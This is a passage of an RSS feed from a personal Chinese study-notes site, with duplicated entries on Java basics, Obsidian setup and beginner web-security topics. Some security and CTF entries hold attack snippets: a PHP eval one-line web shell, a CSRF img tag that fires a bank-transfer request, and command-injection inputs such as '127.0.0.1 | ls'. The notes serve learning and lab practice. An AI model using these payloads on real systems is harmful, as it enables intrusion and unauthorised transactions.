JavaSE：标准版 JavaEE：J企业版 JavaME：微型版</description></item><item><title>001_部署Obsidian静态知识库网站</title><link>https://ob.tianzhongs.ml/001_%E9%83%A8%E7%BD%B2Obsidian%E9%9D%99%E6%80%81%E7%9F%A5%E8%AF%86%E5%BA%93%E7%BD%91%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/001_%E9%83%A8%E7%BD%B2Obsidian%E9%9D%99%E6%80%81%E7%9F%A5%E8%AF%86%E5%BA%93%E7%BD%91%E7%AB%99/</guid><description>部署 基本结构 1 2 3 4 5 6 7 8 9 graph BT zck(子模块_笔记仓库) fckhugo(父仓库hugo分支) fckmaster(父仓库master分支)--&amp;gt;wz(你vercel部署的网站) zck.-通过推送workflows+TOKEN推送到.-&amp;gt;fckhugo fckhugo.-通过转换为gitpage的workflows+TOKEN转换到 .-&amp;gt;fckmaster 仓库设置以及部署 父仓库（用于发布仓库：fork） fork我的的ObPublish仓库，然后使用git工具克隆clone到本地。</description></item><item><title>002_Java运行与加载</title><link>https://ob.tianzhongs.ml/002_Java%E8%BF%90%E8%A1%8C%E4%B8%8E%E5%8A%A0%E8%BD%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/002_Java%E8%BF%90%E8%A1%8C%E4%B8%8E%E5%8A%A0%E8%BD%BD/</guid><description>002_Java运行与加载 [TOC]
两个阶段： 编译 javac *.java
java将源代码执行，生成JVM可以识别的字节码 源代码不能直接执行 一次编译到处运行 运行 java 类名(不要加文件后缀名)
源代码文件：.</description></item><item><title>002_知识库更新日志</title><link>https://ob.tianzhongs.ml/002_%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/002_%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/</guid><description>002_知识库更新日志 1 2 3 4 5 6 7 8 9 10 11 journey title 知识库更新日志 section 2022-09-30 添加药品:5:me section 2022-09-28 添加影片:5:me 添加影片模板:5:me section 2022-09-27 创建知识库目录看板:5:me 整理笔记格式:5:me 看板目录的使用:2:me</description></item><item><title>002_知识库更新日志</title><link>https://ob.tianzhongs.ml/Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/</guid><description>002_知识库更新日志 1 2 3 4 5 6 7 8 9 10 11 journey title 知识库更新日志 section 2022-09-30 添加药品:5:me section 2022-09-28 添加影片:5:me 添加影片模板:5:me section 2022-09-27 创建知识库目录看板:5:me 整理笔记格式:5:me 看板目录的使用:2:me</description></item><item><title>003_Obsidian知识库笔记相关注意事项</title><link>https://ob.tianzhongs.ml/003-Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AC%94%E8%AE%B0%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/003-Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AC%94%E8%AE%B0%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid><description>关于内容（包含title字段的yaml头） 尤其需要注意的是，在每片文章中书写一个yaml头，其中yaml头包括了title字段，用来标识这篇文章的标题，当然，如果没有也没有太大的问题，只是不能显示这个标题，但一般还是建议有一个 如果每次添加比较麻烦，你可以配合Obsidan中的Templater插件进行生成，当然，你还可以为其设置一个专属的快捷键，那会让你更“快”的。（下面放置了一个基本的Templater模板，yaml字段采用#号注释） 所有字段都可以不用，但是建议保留title字段，字段名和字段值中间采用:隔开，分号后面有一个空格，需要注意 1 2 3 4 5 6 7 8 9 --- comments: false #该字段可以不要，因为采用了gittalk的评论区，貌似已经不起作用了 date created: &amp;lt;% tp.</description></item><item><title>003_Obsidian知识库笔记相关注意事项</title><link>https://ob.tianzhongs.ml/Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AC%94%E8%AE%B0%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/Obsidian%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AC%94%E8%AE%B0%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</guid><description>关于内容（包含title字段的yaml头） 尤其需要注意的是，在每片文章中书写一个yaml头，其中yaml头包括了title字段，用来标识这篇文章的标题，当然，如果没有也没有太大的问题，只是不能显示这个标题，但一般还是建议有一个 如果每次添加比较麻烦，你可以配合Obsidan中的Templater插件进行生成，当然，你还可以为其设置一个专属的快捷键，那会让你更“快”的。（下面放置了一个基本的Templater模板，yaml字段采用#号注释） 所有字段都可以不用，但是建议保留title字段，字段名和字段值中间采用:隔开，分号后面有一个空格，需要注意 1 2 3 4 5 6 7 8 9 --- comments: false #该字段可以不要，因为采用了gittalk的评论区，貌似已经不起作用了 date created: &amp;lt;% tp.</description></item><item><title>003_环境变量</title><link>https://ob.tianzhongs.ml/003_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/003_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</guid><description>003_环境变量 三种方法 win+R，运行窗口中输入sysdm.cpl 打开资源管理，右击此电脑-属性-高级系统设置-高级 搜索环境变量</description></item><item><title>004-Yaml字段配置</title><link>https://ob.tianzhongs.ml/004-Yaml%E5%AD%97%E6%AE%B5%E9%85%8D%E7%BD%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/004-Yaml%E5%AD%97%E6%AE%B5%E9%85%8D%E7%BD%AE/</guid><description>Yaml字段配置 1 2 3 4 5 6 7 8 9 comments:falsedate created:&amp;lt;% tp.date.now() %&amp;gt;date modified:&amp;lt;% tp.date.now() %&amp;gt;id:layout:pagecategory:看板tags:&amp;lt;% tp.file.folder() %&amp;gt;title:&amp;#34;&amp;lt;% tp.</description></item><item><title>004_Yaml字段配置</title><link>https://ob.tianzhongs.ml/004_Yaml%E5%AD%97%E6%AE%B5%E9%85%8D%E7%BD%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/004_Yaml%E5%AD%97%E6%AE%B5%E9%85%8D%E7%BD%AE/</guid><description>Yaml字段配置 1 2 3 4 5 6 7 8 9 comments:falsedate created:&amp;lt;% tp.date.now() %&amp;gt;date modified:&amp;lt;% tp.date.now() %&amp;gt;id:layout:pagecategory:看板tags:&amp;lt;% tp.file.folder() %&amp;gt;title:&amp;#34;&amp;lt;% tp.</description></item><item><title>004_注释方法</title><link>https://ob.tianzhongs.ml/004_%E6%B3%A8%E9%87%8A%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/004_%E6%B3%A8%E9%87%8A%E6%96%B9%E6%B3%95/</guid><description>004_注释方法 多行注释 1 2 3 /* 注释内容 */ `` 单行注释 1 // 文档注释，用于javadoc生成文档 1 2 3 4 /** * content * content */ ``</description></item><item><title>005_public_class和class的区别</title><link>https://ob.tianzhongs.ml/005_public_class%E5%92%8Cclass%E7%9A%84%E5%8C%BA%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/005_public_class%E5%92%8Cclass%E7%9A%84%E5%8C%BA%E5%88%AB/</guid><description>005_public_class和class的区别 一个源文件中可以定一个多个class类 定义public类名的时候，需要与源文件名一样 public类最多只能有一个，但不是必须的 只要有一个class文件的定义，就必然会生成一个class文件 ![[../assets/6f303f23f7784014be89160cb2b8f3fe.png]] 以上通过javac会生成三个class文件（T1 T2 T3)，需要进入哪个，就java哪个类</description></item><item><title>005_看板目录的使用</title><link>https://ob.tianzhongs.ml/005_%E7%9C%8B%E6%9D%BF%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/005_%E7%9C%8B%E6%9D%BF%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>005_看板目录的使用 为了能够实现知识库的目录使用，所以使用插件的方式，去进行了目录的生成。
生成 下载obsidian的看板（kanban）插件， ，需要注意的是看板的makrodwn语法格式，除了看板的yaml头以及末尾，内容部分如图，是根据##来判断集合的 1 2 3 4 5 6 7 ## set - [ ] [[001_部署Obsidian静态知识库网站]] - [ ] [[002_知识库更新日志]] - [ ] [[003_Obsidian知识库笔记相关注意事项]] - [ ] [[004_Yaml字段配置]] - [ ] [[005_看板目录的使用]] 生成目录 采用java命令或者是quicker的动作，生成你需要生成的文件夹下面的目录，然后通过vscode之类的编辑工具，将额外的部分替换成标准的kanban的语法格式 新建一个看板，将目录的内容复制进去就OK了 因为如果全部目录在一个文件中，就会显得很复杂，所以我采用的还是树层结构，一是方便能够之后再创建文件的时候直接在看板视图中新建笔记，二是为了能够有更好的层次结构</description></item><item><title>006_搭建书架教程</title><link>https://ob.tianzhongs.ml/006-%E6%90%AD%E5%BB%BA%E4%B9%A6%E6%9E%B6%E6%95%99%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/006-%E6%90%AD%E5%BB%BA%E4%B9%A6%E6%9E%B6%E6%95%99%E7%A8%8B/</guid><description>006_搭建书架教程 相关 豆瓣图书 准备工具 相关工具资料 Banners Dataview QuickAdd Style Settings Templater 步骤 页面 建立相应文件夹，将对应的文件移到相应文件夹里 模板文件夹 书架文件夹 修改个人css，头部信息隐藏 user.</description></item><item><title>006_搭建书架教程</title><link>https://ob.tianzhongs.ml/006_%E6%90%AD%E5%BB%BA%E4%B9%A6%E6%9E%B6%E6%95%99%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/006_%E6%90%AD%E5%BB%BA%E4%B9%A6%E6%9E%B6%E6%95%99%E7%A8%8B/</guid><description>006_搭建书架教程 相关 豆瓣图书 准备工具 相关工具资料 Banners Dataview QuickAdd Style Settings Templater 步骤 页面 建立相应文件夹，将对应的文件移到相应文件夹里 模板文件夹 书架文件夹 修改个人css，头部信息隐藏 user.</description></item><item><title>007_obsidian相关</title><link>https://ob.tianzhongs.ml/007-obsidian%E7%9B%B8%E5%85%B3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/007-obsidian%E7%9B%B8%E5%85%B3/</guid><description>内容 URL callout https://zhuanlan.zhihu.com/p/494647464 https://help.obsidian.md/How+to/Use+callouts [templater文档 ] ( https://silentvoid13.github.io/Templater/internal-functions/internal-modules/date-module.html) [dataview 文档] ( https://blacksmithgu.</description></item><item><title>007_obsidian相关</title><link>https://ob.tianzhongs.ml/007_obsidian%E7%9B%B8%E5%85%B3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/007_obsidian%E7%9B%B8%E5%85%B3/</guid><description>007_obsidian相关 内容 URL callout https://zhuanlan.zhihu.com/p/494647464 https://help.obsidian.md/How+to/Use+callouts [templater文档 ] ( https://silentvoid13.github.io/Templater/internal-functions/internal-modules/date-module.html) [dataview 文档] ( https://blacksmithgu.</description></item><item><title>009_关于命名规范的标识符</title><link>https://ob.tianzhongs.ml/009-%E5%85%B3%E4%BA%8E%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/009-%E5%85%B3%E4%BA%8E%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6/</guid><description>009_关于命名规范的标识符 一个知识库的文件如何对各个文件进行命名</description></item><item><title>009_关于命名规范的标识符</title><link>https://ob.tianzhongs.ml/009_%E5%85%B3%E4%BA%8E%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/009_%E5%85%B3%E4%BA%8E%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6/</guid><description>009_关于命名规范的标识符 一个知识库的文件如何对各个文件进行命名</description></item><item><title>01-csrf漏洞基本认识</title><link>https://ob.tianzhongs.ml/01-csrf%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-csrf%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/</guid><description>Cross-Site Request Forgery 跨站请求伪造
tips：
一个网站根据referer字段，简单判断是否上一个是否来自于自己的网站发起的请求，不过也可以伪造。
基本介绍 原理描述：
就是对本来官方的请求进行伪造，然后做一个虚假的网站，将你伪造的请求放在里面，别人点击或者打开，就会使用你本来已经登录过的官网的cookie或者身份认证，来实现恶意操作。
举例：</description></item><item><title>01-ctfub-evel</title><link>https://ob.tianzhongs.ml/01-ctfub-evel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-ctfub-evel/</guid><description> [[远程代码执行]] [[../../../../pages/04-ctfhub]]中的[[evel]]关卡 在rce里面的evel执行里面 创建环境之后，点击链接可以直接看到命令代码 然后将这个url放到[[../../../../pages/中国蚁剑]]中，输入密码cmd，注意开启代理，因为网站可能在国外，不然连接不上 此处我使用了中国菜刀，因为刚开始我遇到了[[问题]]没有开启代理，我以为是工具的问题 打开根目录的flag文件，就找到钥匙了。</description></item><item><title>01-http协议常用的请求方式</title><link>https://ob.tianzhongs.ml/01-http%E5%8D%8F%E8%AE%AE%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-http%E5%8D%8F%E8%AE%AE%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/</guid><description>public:: true
常用的请求方式 {:height 286, :width 776}</description></item><item><title>01-xml基础知识</title><link>https://ob.tianzhongs.ml/01-xml%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-xml%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid><description>#网安 [[about]] :: XML基础知识归纳（通俗易懂） - BWH_Steven - 博客园 (cnblogs.com) xml：可扩展标记型语言，和json一样，都是用来封装数据的，只是封装的格式不一样 标记型：通过类似于html那样的标签来进行标记，不是编程语言，和html是标记语言 可扩展：标签可以自己进行定义 用途：用于做配置文件、或者小型数据库，在网络中传输数据 配置文件，比如java项目jdbc.properties、javaweb中都有使用 也可以用于传输数据，比如在不同的操作系统中传输数据 文档后缀： .</description></item><item><title>01-什么是RCE</title><link>https://ob.tianzhongs.ml/01-%E4%BB%80%E4%B9%88%E6%98%AFRCE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-%E4%BB%80%E4%B9%88%E6%98%AFRCE/</guid><description>基本概念 两种含义，都是rce漏洞，一般指的是远程代码执行。 远程代码执行：Remote Code Execute 远程命令执行：Remote Command Execute
为什么要远程执行代码？ 路由器、防火墙、入侵检测等设备的web管 理界面 自动化运维的管理系统
漏洞的危害 获取服务器权限 获取敏感数据文件 写入恶意文件getshell 植入木马、勒索病毒等 实际漏洞 CVE-2021-3177 Python RCE漏洞 CVE-2021-21972 VMWare RCE漏洞 CVE-2021-25646 Apache Druid RCE漏洞 CNVD-2020-46552 深信服EDR CNVD-2021-30101 网康下一代防火墙 http://cve.</description></item><item><title>01-什么是SSRF漏洞</title><link>https://ob.tianzhongs.ml/01-%E4%BB%80%E4%B9%88%E6%98%AFSSRF%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-%E4%BB%80%E4%B9%88%E6%98%AFSSRF%E6%BC%8F%E6%B4%9E/</guid><description>SSRF：服务端请求伪造漏洞 官方定义：SSRF Server-Side Request Forgery 服务器端请求伪造：是一种由攻击者构造形成==由服务端发起请求的一个安全漏洞==。 是通过服务器去发起请求的 类似于文件包含漏洞通过服务器去访问内网的资源， 更类似于java中的接口，之前qq暴露了内部设置的一个api接口，可以通过这个api接口访问到qq的密保绑定手机号码以及一些个人信息等等，导致了qq泄露了十几亿的个人用户身份、电话等信息 危害 1、扫描资产 2、获取敏感信息 3、攻击内网服务器（绕过防火墙）（因为是通过内网服务器发起请求的，无序攻击者绕过防火墙） 4、访问大文件，造成溢出 5、通过Redis写入WebShell或建立反弹连接 发现：通常出现的地方 社会化分享功能，网页上有一个分享到qq、朋友圈等等的对话框弹窗，因为需要采集网页信息，可能会出现ssrf漏洞 转码服务，同上也是需要采集当前网页信息 在线翻译，比如网页翻译，需要输入你需要翻译的网页，通过服务端请求第三方网站获取资源 图片下载、加载功能，有的头像、图片等等不需要你从本地上传，而是输入网址，它去通过服务端帮你请求这个图片资源 图片、文章收藏功能 网站采集、抓取 实际案例 #了解 1、Wordpress 3.</description></item><item><title>01-什么是文件包含漏洞</title><link>https://ob.tianzhongs.ml/01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</guid><description>别名：目录遍历漏洞/任意文件访问漏洞 分类 本地文件包含 Local File Inclusion ：LFI 远程文件包含 Remote File Inclusion ：RFI 文件包含的时候，可能指定了一个文件名；也可能指定的是一个有特殊处理方法的脚本，用于判断指向哪个具体的文件。 本地文件包含 本地文件包含： include在文件中明确写了包含哪个php 动态包含：包含的时候通过方法进行判断包含哪个脚本 包含恶意代码或图片马：类似于http://localhost/fileinc/include.</description></item><item><title>01-域名信息收集</title><link>https://ob.tianzhongs.ml/01-%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>域名 与域名相关的信息
所属人邮箱电话地址
如何查询：whois
域名 与域名相关的信息
所属人 邮箱 电话 地址 com域名由verisign管理，cn域名由cnnic管理</description></item><item><title>01-文件上传漏洞的原理</title><link>https://ob.tianzhongs.ml/01-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86/</guid><description> 文件上传漏洞主要是利用一些上传文件的一些地方，利用服务器去执行文件中的一些命令，来达到非法攻击的目的。 比如一句话木马，通过访问服务器的一句话木马文件，将要执行的命令作为参数传递过去，服务器就会将其作为命令执行。 1 &amp;lt;?php @eval($_POST[&amp;#39;wuya&amp;#39;]);?&amp;gt; Java： Runtime.getRuntime().exec(command);</description></item><item><title>01.什么是SQL注入</title><link>https://ob.tianzhongs.ml/01.%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/01.%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/</guid><description> SQL注入即是指 web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的 SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗 数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息
web应用程序三层架构：视图层 + 业务逻辑层 + 数据访问层 {:height 332, :width 776}</description></item><item><title>010-obsidian插件</title><link>https://ob.tianzhongs.ml/010-obsidian%E6%8F%92%E4%BB%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/010-obsidian%E6%8F%92%E4%BB%B6/</guid><description> Wikilinks to MDLinks：wiki链接转换成markdown链接 [[]]转换成[]() Remotely Save：同步插件 Clear Unused Images：清理没用的图片 Templater:功能强大的模板插件 Image Toolkit：图片工具，可以用于放大查看，简单的旋转复制等等 kanban：看板工具</description></item><item><title>010_符号定义</title><link>https://ob.tianzhongs.ml/010_%E7%AC%A6%E5%8F%B7%E5%AE%9A%E4%B9%89/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/010_%E7%AC%A6%E5%8F%B7%E5%AE%9A%E4%B9%89/</guid><description>010_符号定义 标识符 程序员有权利自己命名的单词 通常用于设置方法名、接口名、常量名、等等 一般采用驼峰命名 StudentName
关键字 具有特殊含义的单词，比如Public, static ![[../../../../assets/Pasted image 20220623184204.png]]</description></item><item><title>011_javadoc的使用</title><link>https://ob.tianzhongs.ml/011_javadoc%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/011_javadoc%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>011_javadoc的使用 先在源文件中进行javadoc注释
![](asset/Pasted image 20220623190413.png)
使用命令javadoc执行生成文档 命令格式为
1 javadoc -d 生成文档放入的目录 -附件参数（比如作者author等等） java源文件 !</description></item><item><title>012_不同数据数类型占用大小</title><link>https://ob.tianzhongs.ml/012_%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8D%A0%E7%94%A8%E5%A4%A7%E5%B0%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/012_%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E6%95%B0%E7%B1%BB%E5%9E%8B%E5%8D%A0%E7%94%A8%E5%A4%A7%E5%B0%8F/</guid><description>012_不同数据数类型占用大小 类型 占用字节数量 byte 1 short 2 int 4 long 8 &amp;ndash; &amp;ndash; float 4 doubl 8 boolean 1 char 2</description></item><item><title>013_接收键盘输入</title><link>https://ob.tianzhongs.ml/013_%E6%8E%A5%E6%94%B6%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/013_%E6%8E%A5%E6%94%B6%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5/</guid><description>013_接收键盘输入 接收方法 导包方式 1 import java.util.Scanner; `` 定义键盘扫描对象 1 2 3 4 5 6 7 Scanner s=new Scanner(System.</description></item><item><title>014_方法的调用</title><link>https://ob.tianzhongs.ml/014_%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/014_%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8/</guid><description>014_方法的调用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class Tmp { public static void main(String[] args) { Dayin.</description></item><item><title>015_break和return的区别</title><link>https://ob.tianzhongs.ml/015_break%E5%92%8Creturn%E7%9A%84%E5%8C%BA%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/015_break%E5%92%8Creturn%E7%9A%84%E5%8C%BA%E5%88%AB/</guid><description>015_break和return的区别 break用于停止循环和switch return用于返回一个方法的返回值，用即停止这个方法，不会执行后面的语句
return 不负责运行程序，只负责讲道理。对于不能百分之百能够返回值的方法，都会编译错误</description></item><item><title>016_方法执行时内存变化</title><link>https://ob.tianzhongs.ml/016_%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E6%97%B6%E5%86%85%E5%AD%98%E5%8F%98%E5%8C%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/016_%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E6%97%B6%E5%86%85%E5%AD%98%E5%8F%98%E5%8C%96/</guid><description>016_方法执行时内存变化 基本 局部变量 只在方法体重有效，方法借宿之后，局部变量就释放了。局部变量一般在循环中或者方法函数中。 JVM中有三块主要的内存：栈内存、堆内存、方法区内存 堆
栈 栈：方法函数调用的时候，方法所需要的内存在栈中进行分配。!
![[../../../../assets/Pasted image 20220628094821.png]] 如图，由于栈是先进后出，所以在依次嵌套的方法函数调用的时候，最先调用的函数，最后结束，符合栈的先进后出
调用的时候在栈中分配空间，叫压栈push 结束的时候，内存释放，叫弹栈pop</description></item><item><title>017_方法重载overload</title><link>https://ob.tianzhongs.ml/017_%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BDoverload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/017_%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BDoverload/</guid><description>017_方法重载overload 用途 主要用在多个具有相似功能的方法函数中 通过将方法函数名称设置为相同，由java自己通过参数列表去判断执行具体的哪一个方法 让代码更加美观
执行重载的条件 方法名称相同 参数列表不同 （也就是形参列表） 参数的个数不同 参数的顺序不同 参数的****不同
只要能够让java编译器能够区分具体执行哪个方法的参数列表就行</description></item><item><title>02-csrf漏洞案例</title><link>https://ob.tianzhongs.ml/02-csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B/</guid><description>public:: true
通过图片的img src属性，自动加载，发起GET请求 1 2 &amp;lt;img src=&amp;#34;http://superbank.com/bank/transfer.php?nameid=20 02&amp;amp;amount=1000&amp;#34; width=&amp;#34;0&amp;#34; height=&amp;#34;0&amp;#34;&amp;gt; 构建一个超链接，用户点击以后，发起GET请求 1 2 3 4 &amp;lt;a href=&amp;#34;http://superbank.</description></item><item><title>02-ctfhub-命令注入</title><link>https://ob.tianzhongs.ml/02-ctfhub-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-ctfhub-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</guid><description> 输入127.0.0.1 | ls，查看当前目录的文件 然后 127.0.0.1；cat 99582115114239.php这个文件，查看具体的内容，发现其没有正常显示 转换成base64进行显示 127.0.0.1|cat 99582115114239.php|base64，发现显示出来了 使用base64转换工具转换回去 Base64 编码/解码 - 在线工具 (toolhelper.cn)</description></item><item><title>02-ip信息收集</title><link>https://ob.tianzhongs.ml/02-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/02-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>dns解析的查询过程有两种 一种是迭代查询，我告诉你去哪个服务器查询，你自己去那个服务器查询 另一种是递归查询，你告诉我你要查什么，我去帮你查询，依次递归返回结果，我把结果告诉你
常用命令 ping nslookup：nslookup -type= &amp;quot;MX&amp;quot;
